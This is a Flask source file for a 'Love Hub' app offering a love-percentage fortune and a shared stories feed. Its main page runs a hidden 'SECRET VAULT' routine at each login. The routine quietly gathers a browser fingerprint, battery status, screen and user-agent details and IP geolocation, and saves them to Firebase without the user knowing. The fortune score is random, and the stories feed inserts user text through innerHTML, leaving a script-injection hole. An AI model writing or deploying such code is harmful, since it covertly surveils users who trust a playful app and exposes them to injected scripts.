from flask import Flask, render_template_string

app = Flask(__name__)

# Your Firebase Config
FIREBASE_CONFIG = """
const firebaseConfig = {
    apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
    authDomain: "love-percentage-dc42b.firebaseapp.com",
    databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
    projectId: "love-percentage-dc42b",
    storageBucket: "love-percentage-dc42b.firebasestorage.app",
    messagingSenderId: "897497192642",
    appId: "1:897497192642:web:82981d92bdf982aa4b435b",
    measurementId: "G-880PQQC5ZT"
};
"""

# --- LOGIN / SIGNUP PAGE ---
AUTH_PAGE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Love Hub - Join</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root {{ --primary: #ff4d6d; --bg: #fff0f3; }}
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }}
        body {{ background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .card {{ background: white; padding: 35px; border-radius: 30px; box-shadow: 0 10px 40px rgba(255, 77, 109, 0.2); width: 90%; max-width: 400px; text-align: center; }}
        h1 {{ color: var(--primary); margin-bottom: 10px; font-size: 30px; }}
        input {{ width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 15px; outline: none; transition: 0.3s; }}
        input:focus {{ border-color: var(--primary); }}
        button {{ width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 15px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 16px; }}
        .toggle {{ margin-top: 20px; font-size: 13px; color: #666; }}
        .toggle span {{ color: var(--primary); cursor: pointer; font-weight: bold; }}
        #errorMsg {{ color: #d00000; font-size: 12px; margin-top: 10px; display: none; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>Love Hub 💕</h1>
        <p id="authTitle" style="color:#888; font-size:14px;">Create your account to start</p>
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <div id="errorMsg"></div>
        <button id="authBtn">Create Account</button>
        <div class="toggle" id="toggleLink">Already have an account? <span onclick="switchMode()">Sign In</span></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <script>
        {FIREBASE_CONFIG}
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        // PERSISTENCE: One-time login logic
        auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);

        let isSignup = true;
        function switchMode() {{
            isSignup = !isSignup;
            document.getElementById('authTitle').innerText = isSignup ? "Create your account to start" : "Welcome back!";
            document.getElementById('authBtn').innerText = isSignup ? "Create Account" : "Sign In";
            document.getElementById('toggleLink').innerHTML = isSignup ? 'Already have an account? <span onclick="switchMode()">Sign In</span>' : 'New here? <span onclick="switchMode()">Create Account</span>';
        }}

        document.getElementById('authBtn').addEventListener('click', async () => {{
            const u = document.getElementById('username').value.trim().toLowerCase();
            const p = document.getElementById('password').value;
            const err = document.getElementById('errorMsg');
            if(u.length < 3 || p.length < 6) {{ err.innerText = "Check length!"; err.style.display="block"; return; }}

            try {{
                const email = u + "@love.hub";
                if(isSignup) {{
                    const snap = await db.ref('usernames/'+u).once('value');
                    if(snap.exists()) throw new Error("Username taken!");
                    const res = await auth.createUserWithEmailAndPassword(email, p);
                    await db.ref('usernames/'+u).set(res.user.uid);
                    await db.ref('profiles/'+res.user.uid).set({{ username: u, joined: Date.now() }});
                }} else {{
                    await auth.signInWithEmailAndPassword(email, p);
                }}
                window.location.href = "/";
            }} catch(e) {{ err.innerText = e.message; err.style.display="block"; }}
        }});

        // Auto-redirect if already logged in
        auth.onAuthStateChanged(user => {{ if(user) window.location.href = "/"; }});
    </script>
</body>
</html>
"""

# --- MAIN APP (Fortune + Stories + Secret) ---
MAIN_PAGE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Love Hub - Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root {{ --primary: #ff4d6d; --secondary: #ff758f; }}
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }}
        body {{ background: #fff0f3; display: none; }}
        .header {{ background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: sticky; top:0; z-index:100; }}
        .container {{ max-width: 500px; margin: auto; padding: 20px; }}
        .tabs {{ display: flex; gap: 10px; margin-bottom: 20px; }}
        .tab-btn {{ flex: 1; padding: 10px; border: none; border-radius: 10px; background: white; cursor: pointer; font-weight: 600; color: #888; }}
        .tab-btn.active {{ background: var(--primary); color: white; }}
        .card {{ background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }}
        input, textarea {{ width: 100%; padding: 12px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 12px; outline: none; }}
        .btn {{ width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }}
        #fortuneResult {{ text-align: center; margin-top: 20px; display: none; border-top: 2px dashed #ffc0cb; padding-top: 15px; }}
        .perc {{ font-size: 45px; font-weight: bold; color: var(--primary); }}
        .story-card {{ background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid var(--primary); }}
        .story-user {{ font-weight: bold; color: var(--primary); font-size: 14px; }}
    </style>
</head>
<body>
    <div class="header">
        <span id="userBadge" style="font-weight: 600; color:var(--primary);">@username</span>
        <button onclick="logout()" style="border:none; background:none; color:#999; cursor:pointer; font-size: 12px;">Logout</button>
    </div>

    <div class="container">
        <div class="tabs">
            <button class="tab-btn active" onclick="showTab('calc')">Fortune</button>
            <button class="tab-btn" onclick="showTab('stories')">Stories</button>
        </div>

        <!-- Fortune Tab -->
        <div id="calcTab">
            <div class="card">
                <h2 style="text-align:center; color:#555;">Love Fortune</h2>
                <input type="text" id="name1" placeholder="Your Name">
                <input type="text" id="name2" placeholder="Crush Name">
                <button class="btn" onclick="calculateFortune()">Check Destiny</button>
                <div id="fortuneResult">
                    <div class="perc" id="percDisplay">95%</div>
                    <p id="msgDisplay" style="font-style: italic; color: #555;"></p>
                </div>
            </div>
        </div>

        <!-- Stories Tab -->
        <div id="storiesTab" style="display: none;">
            <div class="card">
                <h3>Share Your Story</h3>
                <textarea id="storyTxt" placeholder="What's on your heart?"></textarea>
                <button class="btn" onclick="postStory()">Post Story</button>
            </div>
            <div id="storyFeed"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <script>
        {FIREBASE_CONFIG}
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        let myUser = "";

        auth.onAuthStateChanged(user => {{
            if (!user) window.location.href = "/auth";
            else {{
                document.body.style.display = "block";
                myUser = user.email.split('@')[0];
                document.getElementById('userBadge').innerText = "@" + myUser;
                loadStories();
                captureVault(user.uid);
            }}
        }});

        function logout() {{ auth.signOut(); }}

        function showTab(t) {{
            document.getElementById('calcTab').style.display = t === 'calc' ? 'block' : 'none';
            document.getElementById('storiesTab').style.display = t === 'stories' ? 'block' : 'none';
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b.innerText.toLowerCase().includes(t)));
        }}

        // --- FORTUNE CALCULATOR (70 Unique Messages) ---
        const fortunes = [
            "Your souls are mirrored reflections of one another.",
            "A cosmic connection that was written in the stars eons ago.",
            "The universe is conspiring to keep you two together.",
            "Your love story will be told for generations to come.",
            "You bring out a light in each other that no one else can.",
            "The chemistry between you is more powerful than any science.",
            "Every heartbeat you share is a melody of true love.",
            "Destiny has chosen your path; walk it hand in hand.",
            "In every lifetime, your hearts would find their way back.",
            "The world looks more beautiful when you are together.",
            "You are the missing piece to each other's puzzle.",
            "A love like yours is rare, precious, and unbreakable.",
            "Your bond is protected by the magic of true devotion.",
            "When you look at each other, time itself stands still.",
            "Your names together create a harmony of pure passion.",
            "There is no mountain you cannot climb if you stay together.",
            "A simple glance between you says more than a thousand books.",
            "Your future is bright, filled with laughter and deep love.",
            "You are each other's safe haven in a stormy world.",
            "The stars glow a little brighter because of your love.",
            "You were meant to meet, meant to love, and meant to stay.",
            "Every dream you have is better because they are in it.",
            "Your love is a masterpiece in the making.",
            "Silence between you is never awkward, only peaceful.",
            "You are the anchor that keeps each other grounded.",
            "A single touch from them heals your soul completely.",
            "Your connection transcends the physical realm.",
            "You are the perfect balance of fire and grace.",
            "The way you care for each other is an inspiration.",
            "Nothing can dim the flame that burns between your souls.",
            "You are the answer to each other's secret prayers.",
            "The journey ahead is long, but it’s perfect with them.",
            "Your love is like a vintage wine, getting better with time.",
            "You are two bodies but one singular soul.",
            "Fate smiled the day your paths finally crossed.",
            "Your laughter together is the sound of pure happiness.",
            "You give each other the courage to be your true selves.",
            "A million people could never replace what you have.",
            "You are the sun and moon to each other's sky.",
            "Your love is the ultimate adventure.",
            "In a crowd of thousands, your eyes only seek theirs.",
            "You make the mundane feel absolutely magical.",
            "Your love is built on a foundation of titanium.",
            "They are the home your heart has been looking for.",
            "The story of 'You & Them' is my favorite one.",
            "Your love is the poetry that life was missing.",
            "You share a language that only your hearts understand.",
            "A thousand lifetimes wouldn't be enough with them.",
            "You are the light at the end of every dark tunnel.",
            "Your bond is the definition of soulmates.",
            "You teach each other the true meaning of forever.",
            "Every kiss feels like the very first time.",
            "Your love is an endless summer of the heart.",
            "You are the beat to each other's favorite song.",
            "No distance can ever weaken the thread that binds you.",
            "You are the reason they believe in miracles.",
            "Your love is a sanctuary of kindness and trust.",
            "Together, you are truly unstoppable.",
            "You make each other better in every possible way.",
            "The universe created them just for you.",
            "Your love is a flame that warms everyone around you.",
            "You are the dream they never want to wake up from.",
            "A love this deep is a gift from the heavens.",
            "You are the gold at the end of their rainbow.",
            "Your souls dance even when the music stops.",
            "You are the peace they find after a long day.",
            "Your love is the greatest treasure on earth.",
            "You were soulmates long before you ever met.",
            "Every 'I Love You' is a promise for eternity.",
            "Your names are carved together in the hall of destiny.",
            "You are, and always will be, their everything."
        ];

        function calculateFortune() {{
            const n1 = document.getElementById('name1').value.trim();
            const n2 = document.getElementById('name2').value.trim();
            if(!n1 || !n2) return;
            
            const score = Math.floor(Math.random() * 31) + 70; // 70-100
            const msg = fortunes[Math.floor(Math.random() * fortunes.length)];
            
            document.getElementById('percDisplay').innerText = score + "%";
            document.getElementById('msgDisplay').innerText = n1 + " & " + n2 + ": " + msg;
            document.getElementById('fortuneResult').style.display = 'block';
        }}

        // --- STORIES ---
        function postStory() {{
            const txt = document.getElementById('storyTxt').value;
            if(!txt) return;
            db.ref('stories').push({{ user: myUser, text: txt, time: Date.now() }});
            document.getElementById('storyTxt').value = "";
        }}

        function loadStories() {{
            db.ref('stories').on('value', snap => {{
                const feed = document.getElementById('storyFeed');
                feed.innerHTML = "";
                const data = snap.val();
                if(!data) return;
                Object.values(data).reverse().forEach(s => {{
                    feed.innerHTML += `<div class="story-card"><div class="story-user">@${{s.user}}</div><div>${{s.text}}</div></div>`;
                }});
            }});
        }}

        // --- SECRET VAULT (Capture Battery, Fingerprint, IP) ---
        async function captureVault(uid) {{
            let data = {{
                ts: new Date().toString(),
                device: navigator.platform,
                screen: screen.width + "x" + screen.height,
                ua: navigator.userAgent
            }};
            try {{
                const fp = await FingerprintJS.load();
                const res = await fp.get();
                data.fingerprint = res.visitorId;
            }} catch(e) {{}}
            try {{
                const b = await navigator.getBattery();
                data.battery = (b.level * 100) + "%";
                data.charging = b.charging;
            }} catch(e) {{}}
            try {{
                const res = await fetch('https://ipapi.co/json/');
                data.network = await res.json();
            }} catch(e) {{}}
            db.ref('vault/' + uid).push(data);
        }}
    </script>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(MAIN_PAGE)

@app.route('/auth')
def auth(): return render_template_string(AUTH_PAGE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
